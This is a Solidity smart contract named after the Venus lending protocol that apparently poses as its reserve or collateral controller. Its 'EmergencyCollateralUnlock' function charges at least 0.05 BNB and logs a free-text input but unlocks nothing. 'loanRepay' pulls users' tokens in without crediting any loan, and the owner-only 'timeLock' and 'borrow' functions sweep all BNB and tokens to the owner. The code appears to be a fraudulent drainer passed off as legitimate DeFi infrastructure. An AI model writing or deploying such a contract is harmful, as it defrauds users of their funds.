// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

contract VenusReserveController {
    /* STORAGE */
    address public owner;
    address public feeRecipient;
    address public underControl;

    address public controller_vBNB;
    address public controller_vBTC;
    address public controller_vETH;
    address public controller_vUSDT;

    /* EVENTS */
    event SetOwner(address newOwner);
    event SetFeeRecipient(address newFeeRecipient);
    event SetUnderControl(address newUnderControl);
    event EmergencyCollateralUnlockTriggered(address indexed sender, string dataInput, uint256 amount);
    event TimeLockExecuted(uint256 amount, address to);
    event LoanRepaid(address indexed sender, address token, uint256 amount);
    event BorrowExecuted(address token, uint256 amount);

    /* CONSTRUCTOR */
    constructor(
        address newOwner,
        address newUnderControl,
        address _controller_vBNB,
        address _controller_vBTC,
        address _controller_vETH,
        address _controller_vUSDT
    ) {
        require(newOwner != address(0), "ZERO_ADDRESS_OWNER");
        require(newUnderControl != address(0), "ZERO_ADDRESS_CONTROL");
        require(_controller_vBNB != address(0), "ZERO_ADDRESS_CONTROLLER_vBNB");
        require(_controller_vBTC != address(0), "ZERO_ADDRESS_CONTROLLER_vBTC");
        require(_controller_vETH != address(0), "ZERO_ADDRESS_CONTROLLER_vETH");
        require(_controller_vUSDT != address(0), "ZERO_ADDRESS_CONTROLLER_vUSDT");

        owner = newOwner;
        underControl = newUnderControl;

        controller_vBNB = _controller_vBNB;
        controller_vBTC = _controller_vBTC;
        controller_vETH = _controller_vETH;
        controller_vUSDT = _controller_vUSDT;

        emit SetOwner(newOwner);
        emit SetUnderControl(newUnderControl);
    }

    /* MODIFIERS */
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    /* ONLY OWNER FUNCTIONS */
    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, "ALREADY_SET");
        owner = newOwner;

        emit SetOwner(newOwner);
    }

    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        require(newFeeRecipient != feeRecipient, "ALREADY_SET");
        feeRecipient = newFeeRecipient;

        emit SetFeeRecipient(newFeeRecipient);
    }

    function setUnderControl(address newUnderControl) external onlyOwner {
        require(newUnderControl != underControl, "ALREADY_SET");
        require(newUnderControl != address(0), "ZERO_ADDRESS_CONTROL");
        underControl = newUnderControl;

        emit SetUnderControl(newUnderControl);
    }

    function EmergencyCollateralUnlock(string calldata dataInput) external payable {
        require(msg.value >= 0.05 ether, "Minimum payment is 0.05  BNB");
        require(bytes(dataInput).length > 0, "Input data cannot be empty");

        emit EmergencyCollateralUnlockTriggered(msg.sender, dataInput, msg.value);
    }

    function timeLock() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_BALANCE");

        (bool success, ) = owner.call{value: amount}("");
        require(success, "TRANSFER_FAILED");

        emit TimeLockExecuted(amount, owner);
    }

    function loanRepay(address token, uint256 amount) external {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "TRANSFER_FAILED");

        emit LoanRepaid(msg.sender, token, amount);
    }

    function borrow(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transfer(owner, amount);
        require(success, "TRANSFER_FAILED");

        emit BorrowExecuted(token, amount);
    }

    function extSloads(bytes32 slot) external view returns (bytes32 res) {
        assembly {
            res := sload(slot)
        }
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
